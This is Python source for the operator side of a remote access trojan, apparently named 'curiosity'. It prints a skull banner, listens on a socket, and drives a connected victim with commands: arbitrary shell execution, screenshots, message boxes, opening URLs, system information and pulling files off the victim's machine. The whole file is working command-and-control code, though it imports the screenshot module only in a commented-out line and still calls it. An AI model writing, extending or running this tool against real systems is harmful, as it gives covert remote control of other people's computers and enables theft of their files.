import socket
import os
#from curiosity_univ import screenshot
from curiosity_univ import server_plat
from curiosity_univ import open_url
from curiosity_win import msgbox
from curiosity_univ.file_transfer import server as ftp
from curiosity_univ.clone_client import clone

def Main():
	print_banner()
	create_socket()
	await_connection()

def banner():
	os.system("color 0A")
	bob_the_skull = '''
	                uuuuuuu
	             uu$$$$$$$$$$$uu
	          uu$$$$$$$$$$$$$$$$$uu
	         u$$$$$$$$$$$$$$$$$$$$$u
	        u$$$$$$$$$$$$$$$$$$$$$$$u
	       u$$$$$$$$$$$$$$$$$$$$$$$$$u
	       u$$$$$$$$$$$$$$$$$$$$$$$$$u
	       u$$$$$$"   "$$$"   "$$$$$$u
	       "$$$$"      u$u       $$$$"
	        $$$u       u$u       u$$$
	        $$$u      u$$$u      u$$$
	         "$$$$uu$$$   $$$uu$$$$"
	          "$$$$$$$"   "$$$$$$$"
	            u$$$$$$$u$$$$$$$u
	             u$"$"$"$"$"$"$u
	  uuu        $$u$ $ $ $ $u$$       uuu
	 u$$$$        $$$$$u$u$u$$$       u$$$$
     	 $$$$$uu      "$$$$$$$$$"     uu$$$$$$
    	u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
    	$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
    	"""      ""$$$$$$$$$$$uu ""$"""
    	          uuuu ""$$$$$$$$$$uuu
    	 u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
     	$$$$$$$$$$""""           ""$$$$$$$$$$$"
     	 "$$$$$"                      ""$$$$""
     	    $$$"                         $$$$"
	'''
	return(bob_the_skull)

def print_banner():
	print(banner())

def create_socket():	
	global b
	global selected_address
	global selected_port

	selected_address = raw_input('Enter The Address For Host > ')
	selected_port = raw_input('Enter The Address For The Desired Port > ')
	clone.second(selected_address, selected_port)

	try:
		b = socket.socket()
		b.bind(((selected_address), int(selected_port)))
		b.listen(5)
		print("[+] Listening For Connection...")
	except:
		print("Unable To Bind Socket On " + selected_address)

def await_connection():
	conn, addr = b.accept()
	execute_commands(conn) #grabs the connection variable and sends saves it when running function

def execute_commands(conn):
	platform_coms = [('uname')]
	while True:
		output = raw_input("Enter a command > ")
		if (output) == 'platform':
			conn.send((output).encode('utf-8'))
			server_plat.Main(conn)
		elif (output) == 'cmd':
			conn.send((output).encode('utf-8'))
			cmd = input("Enter Command > ")
			conn.send((cmd).encode('utf-8'))
			recieved = (conn.recv(1024).decode('utf-8'))
			print(recieved)
		elif (output) == 'terminate':
			conn.send((output).encode('utf-8'))
			conn.close()
		elif (output) == 'create':
			conn.send((output).encode('utf-8'))
			create_type = input("Enter File or Directory > ")
			if (create_type) == 'file':
				conn.send((create_type).encode('utf-8'))
				file_name = input("Enter File Name > ")
				conn.send((file_name).encode('utf-8'))
		elif (output) == 'msgbox':
			conn.send((output).encode('utf-8'))
			msgbox.Main(conn)
		elif (output) == 'open url':
			conn.send((output).encode('utf-8'))
			open_url.server(conn)
		elif (output) == 'screenshot':
			conn.send((output).encode('utf-8'))
			screenshot.server(conn)
		elif (output) == 'transfer':
			conn.send((output).encode('utf-8'))
			file_location = input("Enter Host File Location > ")
			conn.send((file_location).encode('utf-8'))
			string_file_size = ((conn.recv(1024).decode('utf-8')))
			print(string_file_size)
			number_file_size = int(string_file_size)
			print(number_file_size)
			file_name = raw_input("Enter File Name > ")
			f = open(os.getcwd() + "/" + (file_name), "wb")
			while number_file_size > 0:
				l = conn.recv(1024)
				f.write(l)
				number_file_size -= len(l)
			f.close()
			
		elif (output) == None:
			print("No Input")

		else:
			print("Success")

if __name__ == '__main__':
	Main()